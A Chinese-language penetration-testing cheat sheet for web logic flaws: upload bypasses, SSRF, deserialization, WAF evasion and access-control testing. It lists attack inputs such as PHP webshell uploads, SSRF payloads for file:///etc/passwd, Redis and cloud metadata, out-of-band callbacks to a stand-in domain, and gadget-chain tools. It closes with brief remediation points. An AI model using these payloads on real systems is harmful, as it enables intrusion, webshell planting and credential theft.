# Web 逻辑面速查（上传 / SSRF / 反序列化 / WAF 绕过 / 越权）

## 文件上传

- 双扩展名：`shell.php.jpg`；`.htaccess` 覆盖（`AddType application/x-httpd-php .jpg`）；
  图片马：GIF89a 头 + `<?php ... ?>`（PATCH_BYTE 改造）。
- 绕过：Content-Type 改 `image/png`、大小写 `.PhP`、`%00` 截断（旧版）、分块/Unicode 文件名。
- 验证：上传后访问路径确认解析（`http://TARGET/uploads/shell.php.jpg` → 是否执行 PHP）。

## SSRF

- 参数替换：`url=http://127.0.0.1:PORT`、`file:///etc/passwd`、`gopher://127.0.0.1:6379`。
- 外带验证：请求 `http://OAST_DOMAIN/ssrf` 观察回连。
- 云元数据：`http://169.254.169.254/latest/meta-data/`（AWS）、`http://metadata.google.internal/`（GCP）。
- 协议限制绕过：`http://[::1]:8080`、`http://127.0.0.1#.evil.com`、302 跳转链。

## 反序列化

- 指纹：`Cookie: JSESSIONID`（Java）、`laravel_session`（PHP）、`session`（Python Flask）。
- 探测 gadget：`ysoserial`（Java CommonsCollections）、`phpggc`（PHP）生成 PAYLOAD。
- 无回显：延时（`sleep` gadget）与 DNS 外带 OAST_DOMAIN 双验证。

## WAF 绕过

- URL 双重编码 / Unicode 变体；分块传输（`Transfer-Encoding: chunked` 拆 PAYLOAD）。
- 注释符混淆：`/**/`、`/*!50000SELECT*/`；参数污染 HPP：`?id=1&id=2'`。
- 大小写混合 + 关键字拆分；按响应 HEADER（`Server`/`X-Powered-By`）选模板。

## 越权 / 未授权（IDOR / BOLA）

- 替换 Cookie/Token 为另一身份 ROLE_B，重放原请求对比。
- 遍历 `USER_ID`/`ORDER_ID` 等数字参数；批量枚举 `GET /api/users/1..N`。
- 未授权接口：直连 `API_ENDPOINT` 对比 200/403；GraphQL introspection 批量读取。

## 修复要点

上传目录去执行权 + 随机文件名；SSRF 侧用 allowlist 域名/内网 IP 拦截 + 302 跟随限制；
反序列化校验签名与类型白名单；WAF 与业务参数强校验并存；所有对象级接口做属主校验。
